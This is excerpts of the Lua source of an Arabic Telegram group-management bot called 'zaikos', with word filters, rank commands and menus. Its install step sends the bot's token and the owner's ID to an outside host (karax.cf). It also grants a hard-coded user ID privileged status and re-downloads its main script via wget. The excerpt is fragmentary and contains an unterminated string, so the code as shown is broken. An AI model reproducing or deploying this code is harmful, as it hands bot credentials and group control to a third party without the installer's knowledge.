...
https.request('http://karax.cf/zaikos/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("zaikos", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/zaikos
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./zaikos.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S zaikos -X kill
screen -S zaikos ./zaikos
done
]])  
file:close() 
...
var = true  
elseif tonumber(user_id) == tonumber(1139943875) then
var = true  
...
local zaikos_Msg = ''  
if msgs < 100 then 
zaikos_Msg = 'غير متفاعل ' 
elseif msgs < 200 then 
zaikos_Msg = 'بده يتحسن ' 
elseif msgs < 400 then 
zaikos_Msg = 'شبه متفاعل ' 
elseif msgs < 700 then 
zaikos_Msg = 'متفاعل ' 
elseif msgs < 1200 then 
zaikos_Msg = 'متفاعل قوي ' 
elseif msgs < 2000 then 
zaikos_Msg = 'متفاعل جدا ' 
elseif msgs < 3500 then 
zaikos_Msg = 'اقوى تفاعل '  
elseif msgs < 4000 then 
zaikos_Msg = 'متفاعل نار ' 
elseif msgs < 4500 then 
zaikos_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
zaikos_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
zaikos_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
zaikos_Msg = 'احلا تفاعل ' 
elseif msgs < 10000000000 then 
zaikos_Msg = 'رب التفاعل '  
end 
return zaikos_Msg 
end
...
function plugin_zaikosa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.zaikosa and msg then
pre_msg = plugin.zaikosa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function Sourcezaikos(msg,data) -- بداية العمل
if msg then
...
Sourcezaikosr = ' ゠ههلو حياتي 🌝⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, Sourcezaikosr) 
end
end
...
send(msg.chat_id_, msg.id_,zaikos_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf zaikos.lua')
os.execute('wget https://raw.githubusercontent.com/HECTOR-TEMA/zaikos/tree/master/zaikos.lua')
...
usertext = '\n܁༯┆ههلو حياتي 💌 ܰ ['..result.title_..'](t.me/'..(username or 'zaikos')..')'
...
usertext = '\n܁༯┆ههلو حياتي 💌 ܰ ['..data.first_name_..'](t.me/'..(data.username_ or 'zaikos')..')'
status  = '\n☑️┆ تم ترقيته مطور في البوت'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n📤┆ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'zaikos')..')'
status  = '\n☑️┆ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┆العضو » '..userid..''
...
local zaikos1_Msg = database:get(bot_id.."zaikos1:Add:Filter:Rp2"..text..msg.chat_id_)   
if zaikos1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┆ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'zaikos')..') \n 📬┆'..zaikos1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if zaikos_Msg and not Special(msg) then  
local zaikos_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if zaikos_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┆["..zaikos_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](t.me/C5554)}\n🚫┆["..zaikos_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](t.me/C5554)  🌝 ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  🌝 ܰ\n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
メ .zaikos TEAM. メ
≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫
𖤐  .[𝘚𝘰𝘶𝘳𝘤𝘦 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/C5554)≪ 

𖤐  .[𝘋𝘦𝘝 #1](t.me/X666H)≪

𖤐  .[𝘋𝘦𝘝 #2](t.me/S666W)≪

𖤐  .[𝘚𝘰𝘶𝘳𝘤𝘦  𝘍𝘪𝘭𝘦𝘴](t.me/C5554)≪

𖤐  .[𝘛𝘸𝘴 𝘚𝘰𝘶𝘳𝘤𝘦](t.me/HR_TK_bot)≪
≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
Text = [[
≪━━━━━━━━━≫
𖤐 [DEV SOURCE](t.me/X666H)𖤐 
𖤐 [DEV SOURCE](t.me/S666W)𖤐 
≪━━━━━━━━━≫
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'zaikos')..') \n☑️┆ تـم قفـل السيلفي بالتقييد\n⛔┆ الحاله ←التقييد ')  
end,nil)   
...
local UserName = (b.username_ or "zaikos")
...
-------------------------------------LOKRAND - @X666H - @HR_TK_bot - @S666W - @C5554 ---------------------------------------
...
usertext = '\n👤┆ المستخدم » ['..result.title_..'](t.me/'..(username or 'zaikos')..')'
...
usertext = '\n👤┆ العضو » ['..result.title_..'](t.me/'..(username or 'zaikos')..')'
status  = '\n☑️┆ تم الغاء حظره من هنا'
texts = usertext..status
else
...
database:set(bot_id.."zaikos1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."zaikos1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة 🌝 ܰ")  
database:set(bot_id.."zaikos1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."zaikos1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."zaikos1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."zaikos1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁༯┆تم منع الكلمه مع التحذير 🌝 ܰ")  
database:del(bot_id.."zaikos1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."zaikos1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."zaikos1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."zaikos1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان 🌝 ܰ ")  
database:set(bot_id.."zaikos1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."zaikos1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."zaikos1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."zaikos1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."zaikos1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."zaikos1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."zaikos1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."zaikos1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."zaikos1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n٭ 𖤓┆قائمة المنع ☓🌝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local zaikos_Msg = database:get(bot_id.."zaikos1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..zaikos_Msg.."◜\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n܁༯┆ههلو حياتي 💌 ܰ ['..result.title_..'](t.me/'..(text1[3] or 'zaikos')..')'..'\n☑️┆ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'زايكوس').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'زايكوس')
local zaikos_Msg = {
'غمغي🥺🌝 .',
'هلا ابو الحب 💘?? .',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
'ميصير هيج بلحسين شتريد 🔫',
'انه شمسوي بدنياي وشفتك,
}
send(msg.chat_id_, msg.id_,'['..zaikos_Msg[math.random(#zaikos_Msg)]..']') 
return false
end
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'زايكوس').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_, msg.id_,'📌┆ عدد المجموعات الان » { '..#group..' }'..zaikosk..''..zaikos..'\n*☑️┆ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
❁︎ م2 ◂ لعرض التفعيل و التعطيل
❁︎ م3 ◂ لعرض اوامر الوضع ٫ اضف 
❁︎ م4 ◂ لعرض اوامر الحذف 
❁︎ م5 ◂ لعرض اوامر التنزيل و الرفع
❁︎ م6 ◂ لعرض اوامر المجموعة
❁︎ م7 ◂ لعرض اوامر المطور
❁︎ م8 ◂ لعرض اوامر المطور الاساسي
❁︎ م9 ◂ لعرض اوامر الاعضاء
...
❁︎ القيود
❁︎ تنزيل جميع الرتب ٭ تنزيل الرتبه
❁︎╌╌╌╌╌╌╌╌╌╌܁
❁︎ ܁ NO.2
┆ اوامر التغير ▿
❁︎ تغير رد المطور + الاسم
❁︎ تغير رد منشئ اساسي + الاسم
❁︎ تغير رد منشئ + الاسم
❁︎ تغير رد المدير + الاسم 
❁︎ تغير رد الادمن + الاسم 
❁︎ تغير رد المميز + الاسم 
❁︎ تغير رد العضو + الاسم
❁︎ تغير امر الاوامر
...
܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀
┐ تفعيل ܊ تعطيل
❁︎ المجموعات ܊ المشتركين
❁︎ رفع ܊ تنزيل ٭ منشى اساسي ٭
❁︎ مسح الاساسين
...
t =[[
┐ ههلو حياتي حنشتاقلك 🌝 .
❁︎ رابط حذف حسابك في مواقع التواصل 🌝 .
❁︎ ╌╌╌╌╌╌╌╌╌╌ ܁
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'زايكوس')
...
zaikos = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(zaikos)
...
--------------------------------------------------------------------------------------------------------------
Sourcezaikos(data.message_,data)
plugin_zaikosa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local zaikosbot = database:get(bot_id.."zaikos1:Add:Filter:Rp2"..text..result.chat_id_)   
if zaikosbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┆["..zaikosbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local zaikos1_Msg = database:get(bot_id.."zaikos1:Add:Filter:Rp2"..text..result.chat_id_)   
if zaikos1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┆"..zaikos1_Msg)
